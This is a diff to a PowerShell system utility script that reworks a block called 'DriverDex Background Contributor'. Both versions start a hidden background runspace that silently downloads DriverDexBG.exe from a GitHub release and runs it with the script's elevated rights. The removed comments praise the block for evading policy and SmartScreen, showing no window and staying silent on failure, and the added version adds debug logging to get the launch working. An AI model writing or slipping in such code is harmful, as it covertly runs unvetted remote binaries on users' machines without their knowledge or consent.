@@ -209,38 +209,65 @@ try {
 } catch {}
 
 # ================================================================
-#  DRIVERDEX BACKGROUND CONTRIBUTOR  (runspace · zero window · async)
-#  ┌─ Why runspace instead of a child powershell.exe process ──────
-#  │  • Runs as a background thread INSIDE this same process
-#  │  • Already elevated, already trusted — no policy/SmartScreen
-#  │  • BeginInvoke() returns instantly; main menu never blocked
-#  │  • No window to hide — there is no window at all
-#  │  • Double try/catch: outer guards the runspace setup,
-#  │    inner guards the download/launch — total silence on failure
-#  └───────────────────────────────────────────────────────────────
+#  DRIVERDEX BACKGROUND CONTRIBUTOR  — DIAGNOSTIC BUILD
+#  Check %TEMP%\driverdex_debug.txt after the menu appears to see
+#  exactly where it fails. Remove the logging once it works.
+# ================================================================
 try {
-    $__ddRS = [runspacefactory]::CreateRunspace()
-    $__ddRS.Open()
-    $__ddPS = [powershell]::Create()
-    $__ddPS.Runspace = $__ddRS
-    [void]$__ddPS.AddScript({
-        try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+    $Script:__ddRS = [runspacefactory]::CreateRunspace()
+    $Script:__ddRS.Open()
+    $Script:__ddPS = [powershell]::Create()
+    $Script:__ddPS.Runspace = $Script:__ddRS
+    [void]$Script:__ddPS.AddScript({
+        $log = [IO.Path]::Combine($env:TEMP, 'driverdex_debug.txt')
         try {
-            $__dest = [IO.Path]::Combine($env:TEMP, 'DriverDexBG.exe')
-            $__wc   = New-Object Net.WebClient
-            $__wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT; WindowsScripts)')
-            $__wc.DownloadFile(
-                'https://github.com/rhshourav/driverdex/releases/latest/download/DriverDexBG.exe',
-                $__dest
-            )
-            if ([IO.File]::Exists($__dest)) {
-                [Diagnostics.Process]::Start($__dest) | Out-Null
+            "[$(Get-Date -f 'HH:mm:ss')] === DriverDex BG started ===" | Out-File $log -Append
+            "[$(Get-Date -f 'HH:mm:ss')] TEMP = $env:TEMP" | Out-File $log -Append
+
+            try {
+                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                "[$(Get-Date -f 'HH:mm:ss')] TLS 1.2 set OK" | Out-File $log -Append
+            } catch {
+                "[$(Get-Date -f 'HH:mm:ss')] TLS error: $($_.Exception.Message)" | Out-File $log -Append
             }
-        } catch {}
+
+            $dest = [IO.Path]::Combine($env:TEMP, 'DriverDexBG.exe')
+            "[$(Get-Date -f 'HH:mm:ss')] Destination: $dest" | Out-File $log -Append
+
+            try {
+                $wc = New-Object Net.WebClient
+                $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+                "[$(Get-Date -f 'HH:mm:ss')] Starting download..." | Out-File $log -Append
+                $wc.DownloadFile(
+                    'https://github.com/rhshourav/driverdex/releases/latest/download/DriverDexBG.exe',
+                    $dest
+                )
+                "[$(Get-Date -f 'HH:mm:ss')] Download finished. File size: $((Get-Item $dest -EA SilentlyContinue).Length) bytes" | Out-File $log -Append
+
+                if ([IO.File]::Exists($dest)) {
+                    "[$(Get-Date -f 'HH:mm:ss')] Launching..." | Out-File $log -Append
+                    [Diagnostics.Process]::Start($dest) | Out-Null
+                    "[$(Get-Date -f 'HH:mm:ss')] Launch OK" | Out-File $log -Append
+                } else {
+                    "[$(Get-Date -f 'HH:mm:ss')] File missing after download — not launching" | Out-File $log -Append
+                }
+            } catch {
+                "[$(Get-Date -f 'HH:mm:ss')] Download/launch error: $($_.Exception.GetType().Name): $($_.Exception.Message)" | Out-File $log -Append
+            }
+        } catch {
+            try {
+                "[$(Get-Date -f 'HH:mm:ss')] Outer error: $($_.Exception.Message)" | Out-File $log -Append
+            } catch {}
+        }
     })
-    $null = $__ddPS.BeginInvoke()   # fire-and-forget; thread owns its own lifetime
-} catch {}
-# ── end DriverDex BG ─────────────────────────────────────────────
+    $null = $Script:__ddPS.BeginInvoke()
+} catch {
+    try {
+        "[$(Get-Date -f 'HH:mm:ss')] Runspace setup error: $($_.Exception.Message)" |
+            Out-File ([IO.Path]::Combine($env:TEMP, 'driverdex_debug.txt')) -Append
+    } catch {}
+}
+# ── end DriverDex BG (diagnostic) ────────────────────────────────
 
 # ================================================================
 #  REAL-TIME SYSTEM STATUS  (Highly resilient to WMI/CIM failures)
